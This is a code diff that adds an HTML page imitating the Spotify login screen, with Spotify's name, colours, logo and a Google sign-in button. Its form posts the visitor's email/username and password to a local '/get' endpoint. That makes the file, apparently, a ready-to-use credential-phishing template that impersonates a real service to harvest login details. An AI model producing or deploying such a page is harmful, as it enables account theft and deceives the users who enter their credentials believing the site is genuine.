@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Spotify</title>
+    <style>
+      body {
+        font-family: 'Circular', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        background-color: #121212;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 732px;
+        display: flex;
+        background: #fff;
+        border-radius: 12px;
+        overflow: hidden;
+      }
+      .login-form {
+        width: 380px;
+        padding: 40px 40px 52px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+      }
+      .g-h1 {
+        font-size: 16px;
+        font-weight: 700;
+        color: #292929;
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 12px;
+        border: 1px solid #878787;
+        border-radius: 4px;
+        font-size: 14px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+        background: #fff;
+      }
+      .g-input:focus {
+        border-color: #1db954;
+        box-shadow: 0 0 0 1px #1db954;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 14px;
+        background-color: #1db954;
+        color: #000;
+        border: none;
+        border-radius: 500px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        letter-spacing: 1.76px;
+      }
+      .gbtn-primary:hover {
+        background-color: #1ed760;
+        transform: scale(1.02);
+      }
+      .or {
+        display: flex;
+        align-items: center;
+        margin: 20px 0;
+        color: #292929;
+        font-size: 12px;
+        font-weight: 700;
+      }
+      .or::before, .or::after {
+        content: '';
+        flex: 1;
+        border-bottom: 1px solid #292929;
+      }
+      .or span {
+        padding: 0 16px;
+      }
+      .social-btn {
+        width: 100%;
+        padding: 0;
+        height: 40px;
+        background: #fff;
+        border: 1px solid #878787;
+        border-radius: 500px;
+        color: #292929;
+        font-size: 14px;
+        font-weight: 700;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-bottom: 10px;
+      }
+      .social-btn:hover {
+        border-color: #292929;
+        transform: scale(1.02);
+      }
+      .side-image {
+        width: 352px;
+        background: #000;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .side-image img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+      }
+      .footer {
+        margin-top: 20px;
+        font-size: 13px;
+        color: #535353;
+      }
+      .footer a {
+        color: #1db954;
+        text-decoration: none;
+        font-weight: 700;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="login-form">
+        <svg viewBox="0 0 113 34" width="130" height="40" fill="#000">
+          <path d="M8 17.1c0-2.7-2.1-4.9-4.7-4.9S-1.4 14.4-1.4 17.1c0 2.7 2.1 4.9 4.7 4.9s4.7-2.2 4.7-4.9zM.7 17.1c0 1.8 1.4 3.3 3.2 3.3s3.2-1.5 3.2-3.3-1.4-3.3-3.2-3.3-3.2 1.5-3.2 3.3z" transform="translate(8,-6)"/>
+          <path d="M24.5 12.5v9c0 1.4-1.1 2.5-2.5 2.5h-1c-1.4 0-2.5-1.1-2.5-2.5v-9c0-1.4 1.1-2.5 2.5-2.5h1c1.4 0 2.5 1.1 2.5 2.5zm-1.5 0c0-.6-.4-1-1-1h-1c-.6 0-1 .4-1 1v9c0 .6.4 1 1 1h1c.6 0 1-.4 1-1v-9z" transform="translate(8,-6)"/>
+          <path d="M43.4 12.5v9c0 1.4-1.1 2.5-2.5 2.5h-1c-1.4 0-2.5-1.1-2.5-2.5v-9c0-1.4 1.1-2.5 2.5-2.5h1c1.4 0 2.5 1.1 2.5 2.5zm-1.5 0c0-.6-.4-1-1-1h-1c-.6 0-1 .4-1 1v9c0 .6.4 1 1 1h1c.6 0 1-.4 1-1v-9z" transform="translate(8,-6)"/>
+        </svg>
+        <h1 class="g-h1">Log in to Spotify</h1>
+        <form action="/get" method="POST">
+          <input class="g-input" type="text" name="email" placeholder="Email address or username" required>
+          <input class="g-input" type="password" name="password" placeholder="Password" required>
+          <button type="submit" class="gbtn-primary">Log In</button>
+        </form>
+        <div class="or"><span>or</span></div>
+        <button class="social-btn">
+          <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+          Continue with Google
+        </button>
+        <p class="footer">Don't have an account? <a href="#">Sign up</a></p>
+      </div>
+      <div class="side-image">
+        <div style="width:100%;height:100%;background:linear-gradient(135deg,#1db954 0%,#191414 100%);display:flex;align-items:center;justify-content:center">
+          <svg viewBox="0 0 80 80" width="120" height="120" fill="#fff" opacity="0.9">
+            <circle cx="40" cy="40" r="40" fill="#1db954"/>
+            <path d="M25 32c10-3 22-3 32 2" stroke="#000" stroke-width="4" stroke-linecap="round" fill="none"/>
+            <path d="M28 41c8-2 16-2 24 1.5" stroke="#000" stroke-width="3" stroke-linecap="round" fill="none"/>
+            <path d="M31 50c6-1.5 12-1.5 18 1" stroke="#000" stroke-width="2.5" stroke-linecap="round" fill="none"/>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
